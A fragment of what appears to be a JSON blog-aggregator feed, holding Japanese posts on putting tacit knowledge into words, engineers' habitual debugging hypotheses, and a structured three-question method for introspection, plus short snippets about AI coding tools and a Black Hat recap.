trees\\"と説明しなければならない。日本語話者は、木の葉の隙間から差し込む光を見た時、それを1つの概念として認識できる。英語話者も、もちろん同じ光景を見ることはできる。でも、それを「1つのもの」として切り取る認知的なツールを、持っていない。これは、些細な違いに見えるかもしれない。でも、積み重なると、世界の見え方が変わる。プログラミング言語も同じだ。オブジェクト指向言語で考える人と、関数型言語で考える人は、同じ問題に対して、異なる解決策を思いつく。それは、言語が提供する抽象化のツールが、異なるからだ。「クラス」「継承」「カプセル化」という概念で考える人。「関数」「不変性」「副作用」という概念で考える人。同じ問題を見ても、見えているものが違う。言語は、ただ既存の認識を伝えるツールではない。言語は、何が見えるかを決める。つまり、私たちは、言語を通して世界を認識している。言語化する前の「純粋な経験」など、どこにもない。経験は、常にすでに、言語によって構造化されている。言語化の両義性ここまで、このブログ全体を通じて、私は「言語化」という言葉を使ってきた。身体化された知識を言語化する難しさ。言語化による情報の損失。これらの議論は、言語をツールとして捉えている。すでに存在する知識を、言葉という形式に変換する、と。でも同時に、私は別のことも語ってきた。新しい概念を学ぶことで、世界の見え方が変わる。「拡張性」という言葉を知ることで、それまで見えなかった問題が見えるようになる。これは、言語の世界開示的な側面だ。言語は、ツールでもあり、世界を開くものでもある。そして、この二つは矛盾しない。コードレビューで後輩に「この設計は拡張性を損なっている」と言う時、言語はツールとして機能している。私の判断を伝達している。でも同時に、「拡張性」という概念そのものが、問題の見え方を規定している。この言葉がなければ、後輩はこの問題をこの形では認識できない。言語化は、翻訳であると同時に、発見でもある。そして、この認識が、重要な示唆をもたらす。言語化の質を高めることは、語彙を増やすことではない。世界を見る解像度を上げることだ。そして、解像度が上がると、以前は見えなかったものが見えるようになる。区別できなかったものが、区別できるようになる。1つだったものが、複数に分かれる。これは、単なる言葉の問題ではない。認識の問題だ。世界の見え方が、変わる。新しい概念を学ぶとは、新しい言葉を覚えることではない。新しい切り分け方を獲得し、それによって世界が別様に見えるようになることだ。「言語化」という言葉が使われる違和感そして、ここまで語ってきて、私は冒頭で感じた違和感に、再び戻ってくる。「言語化」という言葉を聞くたびに感じる、あの居心地の悪さ。この数年、「言語化力」「思考の言語化」「感情の言語化」といった言葉を、至る所で目にするようになった。まるで、言語化さえできれば、すべてがうまくいくかのように。でも、何かが違う。そう感じ続けてきた。今なら、その違和感の正体が、少し分かる気がする。「言語化」という言葉が、本来の厳しさを失って、語られているのではないか。少なくとも私が経験してきた言語化は、苦しいものだった。自分の感情を言語化しようとすると、その感情の曖昧さに気づく。「怒っている」と思っていた。でも、違う。無力感と焦燥感と羨望が混ざっている。そして、その複雑さに向き合うのは、痛みを伴う。自分の思考を言語化しようとすると、その思考の矛盾が見えてくる。Aだと思っていた。でも、実はBも正しい。AとBは矛盾している。この矛盾を認めることは、自分の考えの浅はかさを認めることだ。言語化には、一種の自己否定が伴う。少なくとも、私にとっては。自分の理解が不完全だったと認める。自分の視点が偏っていたと気づく。自分が変わることを受け入れる。これは、楽なことではない。でも、今、広く使われている「言語化」という言葉は、この厳しさを含んでいるだろうか。「私の気持ちを言語化できた」。そこで終わる。その気持ちの正当性を問わない。その感情の複雑さを掘り下げない。ただ、「言語化できた」という事実が、安心材料になる。これは、たぶん、偶然ではない。仕事は忙しくなり、常に成果を求められる。SNSは即座の反応を要求し、熟考の時間を奪う。情報は溢れ、深く考える前に次の情報が流れてくる。私たちは、葛藤したり苦悩したりしながらものを考える余裕を、失いつつあるのかもしれない。だから、自分を揺さぶる言語化ではなく、自分を肯定してくれる言語化が求められる。自己を問い直す言語化ではなく、自己を確認する言語化が選ばれる。私は、この変化を批判したいわけではない。余裕がないのは、事実だろう。誰もが、必死に生きている。ただ、「言語化」という言葉を使う時、私たちは注意深くありたい。言語化は、自己肯定のツールではない。言語化は、自己を揺さぶり、変容させるものだ。自分の矛盾に向き合う覚悟。自分の無知を認める勇気。自分が変わることを受け入れる強さ。これらを伴わない言語化は、言語化の名に値しない。それは、思考の停止だ。成長の放棄だ。だから、もし「言語化しよう」と言うなら、その厳しさも引き受けるべきだ。そして、もし余裕がないなら、無理に言語化しなくてもいい。言葉にならないものを、言葉にならないまま抱えていることにも、価値がある。曖昧さを保留すること。矛盾を抱えたまま生きること。これらもまた、大切なことなのだと思う。おわりにこのブログを書き終えて、私は少し不思議な気持ちになっている。数年前、後輩に「なんとなく」と言われた時、私は焦っていた。どうやって教えればいいのか。どんな言葉を使えば伝わるのか。万能な説明を探していた。でも、今なら分かる。万能な説明など、存在しない。言語化は、常に不完全だ。身体化された知識を言語化する時、必ず何かが失われる。それは、言語化の欠陥ではない。言語化の本質だ。そして、それでいいのだと思う。言語化しきれないからこそ、共同作業に意味がある。マニュアルを読むだけでは分からないからこそ、一緒に働く価値がある。言葉にならない何かを、空気感で伝え合う。その過程で、新しい知識が生まれる。「おい、言語化しろ」。この言葉は、一見、すべてを言語化することを要求しているように見える。でも、私はもう、そうは思わない。この言葉は、むしろ、こう言っているのだと思う。「言語化できるものを言語化しろ。でも、言語化できないものを、無理に言語化するな」。協働のために必要なことは、言語化しよう。設計の意図、判断の理由、制約条件。これらを共有することで、チームは機能する。でも、すべてを言語化する必要はない。無意識の判断、身体の感覚、創造的な直感。これらは、言語化しないままでいい。言語化すると、かえって失われるから。そして、言語化する時も、謙虚でいよう。「これは、私の視点からの言語化だ」「他の見方もあり得る」「これは、全体ではない」。この謙虚さが、言語化の暴力性を和らげる。身体化された知識、言語化された知識、実践知。3つの知識は、それぞれに価値がある。それぞれに限界がある。一方から他方への変換は、必ず何かを取りこぼす。でも、不完全な変換を繰り返すことで、知識は循環する。深まる。豊かになる。この数年間、私は「言語化」という言葉の違和感と向き合ってきた。そして、今、私はこう思う。言語化は、必要だ。でも、すべてを言語化する必要はない。言語化できないものには、価値がある。沈黙にも、曖昧さにも、矛盾にも、価値がある。言語化は、道具だ。協働のための、理解のための、成長のための、道具だ。でも、人間の全てを、この道具に還元することはできない。言語を超えたところに、私たちは存在している。だから、言語化しよう。でも、言語化できないものを、忘れるな。参考文献言語化するための小説思考作者:小川哲講談社Amazonこうやって頭のなかを言語化する。作者:荒木 俊哉PHP研究所Amazonことば、身体、学び　「できるようになる」とはどういうことか (扶桑社ＢＯＯＫＳ新書)作者:為末 大,今井 むつみ扶桑社Amazon熟達論―人はいつまでも学び、成長できる―作者:為末大新潮社Amazon人生の大問題と正しく向き合うための認知心理学 (日経プレミアシリーズ)作者:今井むつみ日経BPAmazon「何回説明しても伝わらない」はなぜ起こるのか？　認知科学が教えるコミュニケーションの本質と解決策作者:今井むつみ日経BPAmazon私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon知識創造企業（新装版）作者:野中 郁次郎,竹内 弘高東洋経済新報社Amazon経験する機械　――心はいかにして現実を予測し構成するか作者:アンディ・クラーク筑摩書房Amazon訂正可能性の哲学作者:東浩紀株式会社ゲンロンAmazon","isoDate":"2025-11-14T02:20:23.000Z","dateMiliSeconds":1763086823000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Gemini Enterprise でエージェントの登録方法が変わったので、前のエージェントを削除する方法","link":"https://sreake.com/blog/how-to-delete-previous-gemini-enterprise-agent/","contentSnippet":"前置き こんばんは Sreake 事業部の佐藤慧太@SatohJohnです。 Gemini Enterprise のお話です。Gemini Enterprise の管理画面では以下のような画面で「エージェント」して追加、 […]The post Gemini Enterprise でエージェントの登録方法が変わったので、前のエージェントを削除する方法 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-14T01:00:21.000Z","dateMiliSeconds":1763082021000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Claude Code で体験するAIコーディング。GitHub CopilotやCursorとの違いは？","link":"https://sreake.com/blog/ai-coding-with-claude-code/","contentSnippet":"はじめに ここ数年で、ソフトウェア開発におけるAI活用は急速に進んでいます。特に「AIコーディング支援ツール」は、プログラマーの生産性を高める実用的な手段として注目を集めています。 GitHub CopilotやCurs […]The post Claude Code で体験するAIコーディング。GitHub CopilotやCursorとの違いは？ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-13T08:35:30.000Z","dateMiliSeconds":1763022930000,"authorName":"Sreake","authorId":"Sreake"},{"title":"自動選択と成長","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/13/113935","contentSnippet":"配属から八年。僕はチームリーダーになっていた。ある日、後輩の山田が興味深いことを言った。「先輩って、いつもパッと2つか3つ答えますよね。なんでちょうどそのくらいなんですか？」確かに。APIが遅ければ「キャッシュかインデックス」。バグが出れば「ログかデバッガーかスタックトレース」。言語を選ぶなら「ShellかPythonかRust」。「経験則だよ。過去に何度もやってきたパターンが、自動的に浮かんでくるんだ」「でも、なんで1つじゃなくて、4つでもなくて、2つか3つなんですか？」言われてみれば、不思議だった。その夜、僕は過去のケースを思い返してみた。パフォーマンス問題：「キャッシュかインデックス」（2つ）セキュリティ脆弱性：「バリデーション、SQLインジェクション対策、認証強化」（3つ）コードの可読性：「変数名の改善か関数分割」（2つ）ある時は2つ、ある時は3つ。でも4つ以上になることはほとんどない。なぜだ？翌週、僕は田中さん（今は部長）にこの疑問をぶつけた。「田中さん、なんで僕ら、いつも2つか3つしか思い浮かばないんでしょう？」田中さんは笑った。「それはな、脳の処理能力の限界なんだよ」「限界？」「人間の作業記憶は、だいたい3〜4個のチャンクまでしか同時に保持できない。だから無意識に、その範囲内で候補を絞り込んでる。2つか3つがちょうどいいんだ」なるほど。経験則というより、認知的な制約だったのか。でも田中さんは続けた。「ただし、そこには罠がある」「罠？」「2つか3つで思考が止まってしまう。本当は4つ目、5つ目にもっといい答えがあるかもしれないのに」その言葉が頭に残った。数日後、小さなシステム障害が発生した。僕の頭に浮かんだのは「データベースの負荷」「ネットワークの問題」の2つ。いつものパターンだ。両方チェックしたが、どちらも正常。行き詰まった。そこに新人の佐藤さんが言った。「先輩、もしかしてタイムゾーンの設定、変わってませんか？」「タイムゾーン？」確認すると、前日のデプロイでサーバーのタイムゾーン設定が変更されていた。それが原因で、スケジュールされたバッチ処理が予期しない時間に実行され、システムに負荷をかけていた。僕の頭には、その選択肢が浮かばなかった。「いつもの2つ」で思考が停止していた。山田が僕に尋ねたあの質問の答えが、ようやくわかった。2つか3つというのは、経験則であると同時に、認知的な制約でもある。便利だが、危険でもある。その夜、僕はメモを更新した。かつてこう書いていた：「無意識の候補絞り込みに注意。定期的に立ち止まって再考する」今はこう書き直した：「脳は自動的に2〜3個に絞る。便利だが、それが答えの全てではない。4つ目を探せ」翌朝、山田が報告に来た。「先輩、このエラー、認証の問題かセッションの問題だと思うんですけど...」「それで終わり？」「え？」「3つ目は？4つ目は？」山田は戸惑った顔をした。「いや、もっとあるかもしれないけど、パッと浮かぶのはこの2つで...」「そう。パッと浮かぶのは2〜3個なんだ。でも本当の答えは、浮かばなかった4つ目にあるかもしれない」山田の表情が変わった。「じゃあ、どうすれば？」「まず、なぜその2つが浮かんだのか考える。次に、意識的に視点を変えて、他に何があるか探す。そして人に聞く」それから五年。今、僕が後輩を指導するとき、必ずこう言う。「パッと浮かんだ答えは、おそらく正しい。でも必ず4つ目を探せ。それが君を成長させる」脳は2〜3個に絞る。それは人間の性質だ。でも、その枠を超えようとすることが、エンジニアとしての本当の成長なのだと、僕は学んだ。","isoDate":"2025-11-13T02:39:35.000Z","dateMiliSeconds":1763001575000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Black Hat USA 2025 Recap ~ クラウドセキュリティ編 ~","link":"https://speakerdeck.com/kyohmizu/black-hat-usa-2025-recap-kuraudosekiyuriteibian","contentSnippet":"イベント登壇資料です。2025/11/12 CloudSec JP #004\\rhttps://cloudsecjp.connpass.com/event/371229/","isoDate":"2025-11-12T05:00:00.000Z","dateMiliSeconds":1762923600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"おい、内省しろ","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/12/095935","contentSnippet":"はじめに会社のデスクで、モニターを二つ並べて仕事をしている。左の画面には誰かが書いたコード、右の画面には自分が今書いているコード。他人のコードを読んでいると、時々分からなくなる。この人は何がしたかったんだろう、って。変数の名前から推測して、処理の流れを追って、でも結局本人に「なんでこう書いたの？」って聞くと、「なんとなく」「前にこう書いたから」「誰かのを参考にして」。そういう答えが返ってくる。ふと、気づいた。これって、自分の人生も同じじゃないか。なんとなく選んだ会社。なんとなく続けている仕事。理由を聞かれても、ちゃんと答えられない。「みんなが良いって言ってたから」「前にこうしたから」「そういうものだと思ってたから」。朝起きて、メールをチェックして、タスクをこなして、会議に出て、気づいたら夜。明日も同じ。来週も同じ。来月も同じ。これは、私が望んだ人生なんだろうか。それとも、どこかから借りてきた「正しい生き方」を、ただなぞっているだけなんだろうか。なんか違う気がする。なんかモヤモヤする。なんか楽しくない。そう思いながらも、その理由を探そうとはしない。「まあ、動いてるからいいか」。問題が起きてないなら、このまま続ければいい。でも本当にそれでいいのだろうか。動いてる、だけでいいのだろうか。今の生活は、一応回っている。仕事もできている。給料ももらえている。休日もある。友達もいる。それなりに充実している、はず。でも、このままでいいとは思えない。何かが違う。何かが足りない。でもそれが何なのか、分からない。そのためには、まず今の自分を理解しなきゃいけない。自分という人間が、どういう思考で動いているのか。どんな基準で判断しているのか。どんな価値観で選択しているのか。それを見つめることを、内省と呼ぶらしい。この本は、答えを提供するものじゃない。「こうすれば成功する」とか「これが正解だ」とか、そういうことは一切書かれていない。ただ、自分を理解するためのヒントがある。自分という存在を読み解くための問いがある。あなたは、自分のことをちゃんと見たことがあるだろうか。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。なぜ私たちは、自分を見ないのか内省の重要性は、誰もが知っています。「自分を振り返ることは大切だ」。この言葉に反対する人はいないでしょう。でも、実際にやっている人は少ないです。なぜでしょうか。向き合うことが怖いから。 本当の理由を知ることは、怖いです。「自分は才能がない」という結論に辿り着くことが怖いです。「自分は怠けている」という事実を認めることが怖いです。「自分は間違っていた」と認めることが怖いです。だから、表面的な理由で納得します。「忙しいから」「環境が悪いから」「運が悪かったから」。これらの理由なら、自分を責めなくていいです。自分を変えなくてもいいです。でも、この逃避が、成長を止めます。本当の理由に向き合わない限り、同じパターンを繰り返します。同じ失敗をします。同じところで躓きます。やり方が分からないから。「内省しろ」と言われても、何をすればいいのか分かりません。ただぼんやりと「反省」することとは違います。「ああ、失敗した」「次は頑張ろう」。これは内省ではありません。ただの後悔です。内省には、構造があります。フレームワークがあります。順序があります。でも、誰もそれを教えてくれません。学校でも教わりません。会社でも教わりません。だから、多くの人は「内省の仕方」を知らないまま大人になります。即効性がないから。 内省の効果は、すぐには見えません。1回振り返ったからといって、明日から劇的に変わるわけではありません。むしろ、最初は苦しいだけです。自分の醜い部分を見つめることになります。認めたくない事実と向き合うことになります。一方、新しいメソッドや技術を学ぶことには即効性を感じます。「これを使えば、すぐに生産性が上がる」。そんな期待があります。でも、実際にはどうでしょうか。メソッドを次々と試しても、何も変わりません。根本的な問題はメソッドにあるのではなく、自分の中にあるからです。内省の効果は遅効性ですが、持続性があります。一度自分のパターンに気づけば、それは一生使える知恵になります。忙しすぎるから。「内省する時間がない」。これは、最も一般的な言い訳です。そして、最も危険な言い訳でもあります。なぜなら、内省する時間がないほど忙しい状態は、まさに内省が最も必要な状態だからです。複雑で不確実な世界において、内省はかつてないほど重要です。急速な変化、情報過多、常につながり続けるデジタル環境。私たちが直面する課題は、「準備-発射-照準」の反射的行動ではなく、思慮深い内省を要求します。立ち止まって考えることなく走り続けていると、間違った方向に全力で進んでいることに気づきません。効率の悪いやり方を改善することなく、ただ長時間働き続けます。本当に重要なことを見失ったまま、目の前のタスクに追われ続けます。内省する時間がないと言う人ほど、内省が必要です。反省と内省は、まったく違う多くの人が、反省と内省を混同しています。反省は、過去の失敗を後悔すること。「ああ、あの時ああすればよかった」「なんであんなことをしてしまったんだ」。感情的で、自己否定的で、建設的ではありません。内省は、過去の経験を客観的に分析すること。「なぜあの時、あの判断をしたのか」「その判断の背景には、どんな認知があったのか」「次に活かせる学びは何か」。論理的で、客観的で、未来志向です。日本語には実は、この違いを表す2つの言葉があります。反省(はんせい)は、自分の間違いを認め、改善を誓うこと。失敗に焦点を当て、「これは悪かった、次はもっと良くする」と認識します。一方、内省(ないせい)は、より深い自己省察です。内的感情、価値観、動機を吟味します。「私は緊張していた、急いでいた」と自分の内的状態を理解します。判断や評価を保留し、ただ観察します。現代的な「リフレクション」は、この内省に近いです。成功と失敗の両方を客観的に検討し、良い点と悪い点の両方を含み、未来志向で学びを得るプロセスです。優れた組織には「問題がないことこそ問題」という考え方があります。問題を特定できないことは批判的評価の不十分さを示します。つまり、成功したプロジェクトでも振り返りを行い、継続的改善の基盤を作るのです。反省のパターンは破壊的です。失敗します。「自分はダメだ」と落ち込みます。「次は頑張ろう」と決意します。でも、具体的に何を変えるかは分かりません。しばらくすると、同じ失敗を繰り返します。再び落ち込みます。そして「頑張ろう」と決意します。このループは、何も生みません。なぜなら、「なぜ失敗したのか」を本当に理解していないからです。表面的な感情だけで終わっているからです。内省のパターンは建設的です。失敗します。そして、3つの問いで振り返ります。まず第一の問い「本当は何が起きているのか？」を投げかけます。何が起きたのか（事実）を特定します。それについてどう思ったか（意見）、どんな感情を抱いたか（感情）を切り分けます。事実と解釈を混同せず、客観的に観察します。次に第二の問い「私はどんな前提で動いているのか？」を掘り下げます。背景にどんな過去の経験があったか（経験）、判断に影響を与えた価値観は何か（価値観）を見つめます。この問いを通じて、失敗の「構造」が見えてきます。「自分はこういう状況で、こういう判断をしやすい」という無意識のパターンが明らかになります。そして第三の問い「他にどんな可能性があるのか？」を探ります。そのパターンを理解した上で、別の解釈、別の前提、別の反応を探します。固定された一つの見方から解放され、次は違う選択ができるようになります。この3つの問いを通じて、失敗は学びに変わります。反省は自己否定で終わります。内省は自己理解から始まります。認知を解剖する内省の基本は、「メタ認知」を高めることです。メタ認知とは、「認知していることを認知する」能力。自分がどう考えているかを、一歩引いて客観的に観察する能力です。私たちは毎日、無数の判断をしています。でも、その判断がどこから来ているのか、意識していません。「新しいことは難しい」「あの人は信頼できない」「自分には無理だ」「これは正しい」。これらの判断は、どこから生まれているのでしょうか。実は、私たちの認知には構造があります。そして、この構造を理解することで、自分の判断を客観的に見つめ、必要に応じて変えることができます。ここで重要なのは、学びには2つの深さがあるということです。表面的な学びは、既存の目標や前提を維持しながら誤りを修正するだけです。一方、深い学びは、目標や価値観、枠組みそのものを問い直します。内省の本質は、まさにこの「前提を疑う」ことにあります。行為とその結果だけでなく、行為の背後にある価値観や仮定を検討することで、根本的な変革が可能になります。内省の3つの問い内省とは、自分に適切な問いを投げかけることです。適切な問いは、見えなかったものを見えるようにします。深い問いは、表面の下にある本質を明らかにします。そして、内省には、3つの核心的な問いがあります。第一の問い：「本当は何が起きているのか？」これは、事実と解釈を分ける問いです。私たちは、事実と解釈を混同しています。「上司が私を嫌っている」。これは事実でしょうか。違います。解釈です。事実は「上司が今日、挨拶しなかった」。それを「嫌っている」と解釈しているのは、自分です。「自分には才能がない」。これは事実でしょうか。違います。解釈です。事実は「この課題がうまくできなかった」。それを「才能がない」と解釈しているのは、自分です。「新しいことは難しい」。これは事実でしょうか。違います。解釈です。事実は「過去に一度、新しいことで挫折した」。それを「すべての新しいことは難しい」と解釈しているのは、自分です。この第一の問いは、現実を歪めている色眼鏡を外す問いです。私たちは世界をありのままに見ていません。自分のフィルターを通して見ています。そして、そのフィルターに気づいていません。実践：事実と解釈を分ける今、あなたが悩んでいること、困っていること、避けていることを1つ選びます。そして、こう問います。「ここで確実に起きた事実は何か？」具体的に、何が起きたのか？誰が、何を、いつ、どこで？測定可能な、観察可能な事実は？「私はそれをどう解釈しているのか？」- 私は何を「意味する」と思っているのか？- 私はどんな物語を作っているのか？- 私は何を「真実だ」と決めつけているのか？例を見てみましょう。場面：プロジェクトのリーダーを打診されて断った混在した状態：「私にはリーダーの能力がないから断った。自分は向いていない。失敗したら大変なことになる」分離した状態：事実：上司から「次のプロジェクトのリーダーをやってみないか」と打診された私は「今は忙しいので」と断った過去に一度、小規模なチームのリーダーをして、メンバーとの調整に苦労した解釈：「私にはリーダーの能力がない」「失敗したら大変なことになる」「自分は向いていない」「リーダーとは特別な才能を持った人がやるものだ」この分離をすると、驚くべきことが見えてきます。事実はシンプルで、解釈は複雑です。そして、自分を縛っているのは事実ではなく、解釈です。事実「過去に一度苦労した」から、解釈「自分には能力がない」を導き出しています。でも、それは論理的に正しいでしょうか。一度の苦労は、能力がないことの証明でしょうか。むしろ、苦労しながらも完遂したことは、学びと成長の証拠ではないでしょうか。「能力がない」という解釈は、本当に事実に基づいているのでしょうか。それとも自分の恐怖が作り出した物語なのでしょうか。第一の問いは、この物語に気づくための問いです。第二の問い：「私はどんな前提で動いているのか？」これは、無意識のルールを見つける問いです。私たちの行動は、無意識のルールに支配されています。「〜べき」「〜ねばならない」「〜してはいけない」。これらのルールは、意識されることなく、すべての判断を決定しています。このルールを、前提と呼びます。前提とは、「当たり前だ」と思っていて、疑ったことがない思い込みです。実践：前提を発掘する先ほどの解釈を、さらに深く掘り下げます。「なぜそう解釈したのか？」を問い続けると、前提が見えてきます。解釈：「私にはリーダーの能力がない」 → なぜそう思う？ → 前提：「リーダーとは、最初から完璧にできる人だ」解釈：「失敗したら大変なことになる」 → なぜそう思う？ → 前提：「失敗は許されない」「失敗は恥だ」解釈：「自分は向いていない」 → なぜそう思う？ → 前提：「向いていないことはやるべきではない」「苦労するのは才能がない証拠だ」これらの前提を言語化すると、あることに気づきます。完璧に同じ一つの真実というものは、ほとんどこの世にありません。あるのは、いろんな解釈だけです。「リーダーとは、最初から完璧にできる人だ」→本当に？多くのリーダーは試行錯誤しながら成長してきたのでは？「失敗は許されない」→本当に？失敗から学ぶことの方に価値があるのでは？「苦労するのは才能がない証拠だ」→本当に？苦労するのは、新しいことに挑戦している証拠では？前提は、過去の経験から形成されます。多くの場合、子供の頃の経験、初期の失敗体験、周囲の大人の言葉。これらが積み重なって、前提が作られます。でも、その前提が今のあなたに適切かどうか、検証されたことはありません。第二の問いは、この無意識のルールを意識化する問いです。前提を見つける手がかり：「〜べき」「〜ねばならない」を探す「完璧であるべき」「人に迷惑をかけてはならない」「弱みを見せてはいけない」「当たり前だ」と思っていることを疑う「仕事は辛いものだ」→本当に？「年齢相応の成果を出すべきだ」→なぜ？「感情を出すのは未熟だ」→誰がそう決めた？自分を縛っている「ルール」を書き出す私は◯◯してはいけない私は◯◯でなければならない私は◯◯すべきだこれらの前提を可視化すると、驚くべき発見があります。自分を最も縛っているのは、自分が作ったルールだったということです。第三の問い：「他にどんな可能性があるのか？」これは、固定された見方を解く問いです。第一の問いで事実と解釈を分けました。第二の問いで前提を見つけました。そして第三の問いで、新しい解釈、新しい前提を探します。私たちは、1つの見方に固執しています。「これしかない」「他に選択肢はない」。でも、本当にそうでしょうか。実践：視点を変える同じ事実に対して、複数の解釈を試してみます。事実：プロジェクトのリーダーを打診された。過去に一度リーダーをして苦労した。解釈A（元の解釈）：「自分には能力がない。失敗する。やるべきではない」→ 前提：「完璧でなければやってはいけない」解釈B（新しい解釈）：「上司は自分の成長を期待している。苦労した経験から学んだことを活かせる機会だ」→ 前提：「成長は挑戦から生まれる」解釈C（新しい解釈）：「過去の経験があるからこそ、今回は違うアプローチができる。苦労を知っているからこそ、メンバーの気持ちが分かる」→ 前提：「経験は財産だ」解釈D（新しい解釈）：「完璧である必要はない。学びながら進めばいい。サポートを求めてもいい」→ 前提：「不完全でも価値がある」同じ事実でも、解釈次第で、まったく異なる未来が開けます。解釈Aを選べば断ります。解釈B、C、Dを選べば引き受けます。そして、どちらを選ぶかは自分次第です。ここで重要な気づきがあります。私たちは、解釈を選ぶことができます。事実は変えられません。でも、解釈は選べます。そして、解釈が変われば感情が変わります。感情が変われば行動が変わり、結果が変わります。可能性を開く問いかけとして、次のようなものがあります。「もし〜だとしたら？」もしこれが学びの機会だとしたら？もし失敗してもいいとしたら？もし周囲がサポートしてくれるとしたら？「別の角度から見たら？」この状況を、5年後の自分はどう見る？自分の親友がこの状況にいたら、何とアドバイスする？尊敬する人なら、どう捉える？「最悪と最高の間には？」最悪のシナリオは？（たいてい、そこまで悪くない）最高のシナリオは？（たいてい、可能性がある）現実的な中間のシナリオは？第三の問いは、固定された一つの見方から、複数の可能性へと視野を広げる問いです。内省の実践この3つの問いは、連鎖しています。第一の問いで、事実と解釈を分けます。「私は世界を歪めて見ている」ことに気づきます。第二の問いで、なぜ歪めて見ているのかを理解します。「無意識の前提が判断を決めている」ことに気づきます。第三の問いで、他の見方を探します。「1つの見方に固執する必要はない」ことに気づきます。この3つの問いを繰り返すことで、内省は深まります。そして、驚くべき変化が起きます。同じ状況に対する反応が、まったく変わります。具体例：「新しい技術を学ぶのが億劫だ」第一の問い：本当は何が起きているのか？混在：「新しい技術を学ぶのが億劫だ。自分には向いていない」事実として起きていること。- 新しい技術を学ぶ機会がある。- 2年前、別の技術を学ぼうとして3日で諦めた。- 今、学ぶことに対して億劫な気持ちがある。私の解釈。「自分には学習能力がない」「新しいことは難しい」「どうせまた挫折する」第二の問い：私はどんな前提で動いているのか？解釈の背後にある前提。「学習はスムーズに進むべきだ」「一度失敗したら、それは自分の限界を示している」「若い人の方が学習は早い。自分は遅い」「完璧に理解してから次に進むべきだ」これらの前提は本当か？学習は常にスムーズか？→違う。試行錯誤がつきものだ。一度の失敗は限界の証明か？→違う。方法が悪かっただけかもしれない。年齢と学習能力の関係は？→必ずしも相関しない。経験がある分、理解が早いこともある。完璧に理解する必要があるか？→ない。使いながら学ぶ方が効率的だ。第三の問い：他にどんな可能性があるのか？別の解釈。「2年前より今の方が経験は豊富だ。以前とは違うアプローチができる」「小さく始めれば、学べる」「完璧を目指さず、まず触ってみる」「分からないことは、聞けばいい」この新しい解釈を採用すると、行動が変わります。「億劫だ」から「試してみよう」に変わります。3つの問いを日常に組み込むこの3つの問いは、特別な時だけでなく、日常的に使えます。朝、仕事を始める前：第一の問い「今日、本当にやるべきことは何か？」（事実と解釈を分ける）困難に直面したとき：第二の問い「私はどんな前提で『難しい』と判断しているのか？」（前提を疑う）選択に迷ったとき：第三の問い「他にどんな選択肢があるのか？」（可能性を広げる）一日の終わりに：3つの問いすべて「今日、何が起きたのか？なぜそう反応したのか？他にどう反応できたか？」この3つの問いを習慣にすることで、内省が日常の一部になります。特別な儀式ではなく、呼吸のように自然な行為になります。そして、この問いかけを続けると、驚くべき変化が起きます。同じ状況に対して、違う反応をしている自分に気づきます。以前なら逃げていた場面で、立ち向かっています。以前なら諦めていた場面で、別の方法を試しています。これが、内省の力です。問いが、現実を変えます。3つの問いがもたらす変化この3つの問いを使い続けると、3つの大きな変化が起きます。変化1：「見る力」が変わる第一の問い「本当は何が起きているのか？」を繰り返すことで、事実を歪めずに見る力が育ちます。以前は「あの人は私を嫌っている」と思っていたことが、「あの人は今日挨拶しなかった。理由は分からない」と冷静に見られるようになります。事実と解釈を分けることが、自然にできるようになります。そして、世界がクリアに見えるようになります。色眼鏡を外したように。自分が作り出していた恐怖、不安、怒りの多くは、実は解釈が生み出していたと気づきます。「見えないもの」へ怯えていたと気づきます。事実は、思っていたほど悪くありません。変化2：「選ぶ力」が生まれる第二の問い「私はどんな前提で動いているのか？」を繰り返すことで、無意識のルールから自由になります。以前は「〜べき」「〜ねばならない」に縛られていました。「完璧でなければダメだ」「失敗してはいけない」「人に頼るのは弱さだ」。これらのルールが、行動を制限していました。でも、前提に気づくことで、「このルールは本当に必要か？」と問えるようになります。そして、不要なルールを手放せるようになります。「完璧でなくてもいい」「失敗から学べばいい」「助けを求めてもいい」。新しいルールを採用できるようになります。これは、自由の感覚です。「〜しなければならない」から「〜できる」へ。義務から選択へ。変化3：「可能性」が見えるようになる第三の問い「他にどんな可能性があるのか？」を繰り返すことで、固定された一つの見方から解放されます。以前は「これしかない」「他に方法はない」と思っていました。1つの解釈に固執していました。でも、同じ事実に対して複数の解釈があることを知ります。そして、解釈を選べることを知ります。すると、行き詰まりが減ります。「もう無理だ」と思っていた場面で、「別の角度から見たら？」と考えられるようになります。新しい道が見えるようになります。これは、希望の感覚です。「詰んだ」という漠然とした終わった状態から「まだ可能性がある」へ。絶望から探求へ。syu-m-5151.hatenablog.com自分を突き動かすものは何か？私たちは、一人ひとり異なる動機の源を持っています。チームのプロジェクトが成功したとき、誰もが喜んでいても、その理由は違います。ある人は「難しい課題を解決できた」ことに喜びを感じます。ある人は「チームで協力できた」ことに喜びを感じます。ある人は「顧客に価値を届けられた」ことに喜びを感じます。ある人は「自分のスキルが認められた」ことに喜びを感じます。同じ成功でも、やりがいの源は人それぞれ異なります。そして、この動機の源を知らないことが、多くの問題を生みます。「この仕事、やりがいを感じない」と思います。しかし、なぜやりがいを感じないのか、分かりません。それは、自分の動機の源を知らないからです。もし、あなたの動機の源が「技術的な深さを追求すること」だとします。ところが今の仕事は、浅い実装の繰り返しです。当然、やりがいを感じません。一方、もしあなたの動機の源が「チームで協力すること」だとします。ところが今の仕事は、一人で黙々と作業することが多いです。当然、モチベーションが下がります。動機の源を知らないと、「なぜやる気が出ないのか」が分かりません。「自分は向いていないんだ」と誤解します。しかし、向いていないのではありません。動機の源が満たされていないだけです。動機の源を探るには、「やりがいを感じた仕事」を1つ思い浮かべ、3つの問いで振り返ります。第一の問い：何が起きたのか？（事実）どんなプロジェクトだったか？どんな役割だったか？第二の問い：なぜやりがいを感じたのか？（前提）自分は何を大切にしていたのか？何が満たされたのか？第三の問い：他のどんな仕事でも同じやりがいを感じられるか？（可能性）この要素は他の場面でも再現できるか？この振り返りから見えてくる「大切にしていること」が、あなたの動機の源です。動機の源は、人によって大きく異なります。そして、優劣はありません。探求